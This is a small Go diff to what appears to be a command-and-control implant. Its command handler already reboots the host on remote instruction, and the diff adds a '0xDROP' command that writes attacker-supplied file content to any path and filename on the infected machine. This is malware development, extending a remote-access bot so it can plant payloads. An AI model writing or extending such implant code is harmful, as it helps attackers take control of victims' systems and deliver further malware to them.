@@ -100,5 +100,11 @@ func HandleCommands(id string, dat string, parameters string) {
 		//go CommandUpdateC2(id, "Executed...")
 		time.Sleep(10 * time.Second)
 		RunCmd("reboot")
+	case "0xDROP": //Drop file to host
+		settings := strings.Split(parameters, "|")
+		// parameters = content|path|name
+		if len(settings) >= 3 {
+			DropFile(settings[0], settings[1], settings[2])
+		}
 	}
 }
